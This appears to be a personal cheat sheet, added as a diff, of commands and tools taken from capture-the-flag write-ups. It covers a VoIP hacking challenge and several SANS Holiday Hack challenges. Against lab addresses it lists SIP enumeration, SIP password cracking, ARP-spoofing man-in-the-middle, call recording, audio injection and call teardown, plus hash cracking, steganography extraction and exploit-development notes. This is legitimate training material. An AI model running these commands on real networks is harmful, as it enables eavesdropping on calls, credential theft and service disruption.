@@ -1,0 +1,98 @@
+https://www.ethicalhacker.net/features/skillz/the-nightmare-before-charlie-browns-christmas-answers-and-winners/
+
+dhclient
+ifconfig
+msfconsole
+msf > use auxiliary/scanner/sip/enumerator
+msf > set RHOSTS 10.10.10.77
+msf > set MINEXT 1000
+msf > set MAXEXT 1100
+msf > run
+messages.dat
+.pcap files
+Wireshark Filter: arp
+http://code.google.com/p/sipvicious/
+svcrack.py –externalip 10.10.10.55 -u 1001 -d password_list 10.10.10.77
+http://www.linphone.org/
+linphone
+Wireshark Filter: sip.Request-Line contains "SUBSCRIBE sip:1001" or sip.Request-Line contains "SUBSCRIBE sip:1004"
+Wireshark Filter: bootp
+Wireshark Filter: eth.addr == 00:50:56:10:10:55
+egrep -o ‘Registration from .+ Wrong password’ messages.dat | sort | uniq -c
+echo 1 > /proc/sys/net/ipv4/ip_forward
+http://monkey.org/~dugsong/dsniff/
+arpspoof -i eth0 -t 10.10.10.77 10.10.10.1 &
+arpspoof -i eth0 -t 10.10.10.1 10.10.10.77 &
+http://ettercap.sourceforge.net/
+cain
+http://dallachiesa.com/
+rtpbreak -i eth0 -m -W -d /tmp/rtp &
+tshark -i eth0 -f "udp port 5060" -R "sip.Request-Line contains INVITE" -T fields -e sip.From -e sip.To -e sip.Call-ID
+http://sox.sourceforge.net/
+play -q -t ul <(tail -f -c 0 rtp.0.1.raw) &
+http://ucsniff.sourceforge.net/
+http://vomit.xtdnet.nl/
+http://www.enderunix.org/voipong/
+rec -1 -r 8000 -c 1 message.wav
+rtpinsertsound -a 10.10.10.77 -A 12280 -b 10.11.11.22 -B 59300 -f 1 -j 50 message.wav
+http://www.hackingvoip.com/sec_tools.html
+teardown eth0 1002 10.10.10.77 10.10.10.77 MTg2OGJmNDE4MWExNzQwM2VhYjFkNGQyMDdmN2QwZGU. "" ""
+redirectpoison eth0 10.11.11.33 5060 "<sip:1005@10.10.10.77>"
+Wireshark Filter: rtp and ip.src == 10.10.10.77 and ip.dst == 10.11.11.22
+Wireshark Filter: sip.Request-Line contains BYE
+
+
+http://www.dafthack.com/sans-holiday-challenge-2012-write-up
+./john /root/Desktop/hash.txt --format=raw-md5 --wordlist=/pentest/passwords/wordlists/rockyou.txt
+steghide --extract –sf /root/Desktop/off.jpg -p IceIceBaby!.
+sqlite3 wc.db .schema | grep NODES
+sqlite3 wc.db 'select local_relpath, checksum from NODES'
+sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;'
+wget -O – http://snowmiser.counterhack.com/
+echo -n '2012-12-11 17:45 7998f77a7dc74f182a76219d7ee58db38be3841c' | sha1sum
+
+
+http://securityg33k.blogspot.com/2014/01/sans-holiday-hack-challenge-2013.html
+cross site scripting
+sql injection with sqlmap
+file upload via sqlmap
+command execution via web browser
+netwitness investigator
+Xplico - xplico.org
+Network Miner - netresec.com
+
+
+2014
+
+
+https://itunsecurity.wordpress.com/2015/12/23/2015-sans-holliday-hack-challenge-writeup-walkthrough/
+python
+scapy
+burp suite decoder
+binwalk
+https://code.google.com/p/firmware-mod-kit/source/checkout
+unsquashfs
+file fs
+strings ../opt/mongodb/gnome.0 | grep password -A 4 -B 4
+shodan
+directory traversal
+can swap url encoded form output with json object in proxy
+nmap
+arm v intel binary
+netstat
+ida pro
+hopper
+nc
+https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+gdb
+gdb> set follow-fork-mode child #have gdb follow child process
+gdb> run
+http://debugger.immunityinc.com/
+immunity debugger on windows
+stack canaries
+metasploit pattern_offset script
+dll rebasing
+aslr
+nasm
+https://gist.github.com/joswr1ght/a45d000ceaccf4cce6cb # disable DEP
+dmesg | grep NX # validate disabled execute
